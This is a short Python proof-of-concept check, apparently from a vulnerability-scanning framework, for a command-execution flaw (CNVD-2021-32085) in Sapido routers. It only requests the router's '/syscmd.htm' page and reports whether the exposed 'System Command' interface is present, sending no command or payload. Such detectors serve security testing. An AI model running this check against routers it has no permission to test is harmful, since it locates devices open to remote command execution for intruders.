# title: Sapido多款路由器命令执行漏洞
# cve-id: CNVD-2021-32085
# author: jgz

from poctools import BasicPoc
import requests


class Poc(BasicPoc):
    def __init__(self):
        super(Poc, self).__init__()
        self.name = ""
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Aoyou/biEzMm5kNDRrWTcgazFsTEFTYejkYHK-l5UHLC1JPOhy_B1sefJvAsiTZA=='}
        self.timeout = 20

    def verify(self, url: str) -> bool:
        target = url.strip("/")
        target_1 = f'{target}/syscmd.htm'
        try:
            response = requests.get(target_1, headers=self.headers, timeout=self.timeout, verify=False)
            if response.status_code == 200 \
                    and "System Command" in response.text \
                    and "Apply" in response.text:
                # print(response.text)
                # print(111111, target)
                return True
        except Exception as err:
            pass
        return False


if __name__ == '__main__':
    url = "http://127.0.0.1"
    poc = Poc()
    result = poc.run(url)
    print(f"{url} -> {result}")
